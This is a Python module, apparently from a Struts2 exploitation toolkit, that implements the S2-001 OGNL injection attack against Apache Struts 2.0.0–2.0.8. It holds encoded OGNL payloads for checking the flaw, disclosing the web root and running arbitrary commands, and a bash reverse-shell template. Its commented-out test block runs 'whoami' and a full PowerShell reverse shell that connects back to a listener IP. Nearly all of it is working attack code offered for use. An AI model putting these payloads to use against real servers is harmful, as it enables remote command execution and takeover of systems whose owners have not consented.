import random
from exploit import tools
import urllib.parse

class S2_001:
    """S2-001漏洞检测利用类"""
    info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹windows,Linux,shell"
    check_poc = "%25%7B{num1}%2B{num2}%7D"
    web_path = "%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath('%2F'))%2C%23response.flush()%2C%23response.close()%7D"
    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        if not data:
            self.data = "username=test&password={exp}"
        else:
            self.data = data
        self.headers = tools.parser_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        #print(self.headers)
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        data = self.data.format(exp=poc)
        html = tools.post(self.url, data, self.headers, self.encoding)
        num_sum = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif num_sum in html:
            self.is_vul = True
            return 'S2-001'
        else:  # 存在检测不到漏洞但可以命令执行
            if tools.echo_check(self):
                self.is_vul = True
                return 'S2-001'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        data = self.data.format(exp=self.web_path)
        html = tools.post(self.url, data, self.headers, self.encoding)
        html = tools.get_html_text(html)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        cmd = tools.parser_cmd(cmd)
        data = self.data.format(exp=self.exec_payload.format(cmd=urllib.parse.quote(cmd)))
        html = tools.post(self.url, data=data, headers=self.headers, encoding=self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """Linux 反弹shell"""
        html = tools.reverse_shell(self, ip, port)
        return html

    def reverse_shell_win(self, ip, port):
        """windows 反弹shell"""
        html = tools.reverse_shell_win(self, ip, port)
        return html

# if __name__ == '__main__':
#     s = S2_001("http://192.168.217.138:8080/login.action")
#     print(s.info)
#     print(s.check())
#     print(s.get_path())
#     print(tools.get_html_text(s.exec_cmd("whoami")))
#     print(s.exec_cmd("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.3.134',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""))
#     s.reverse_shell('192.168.3.134', '4444')

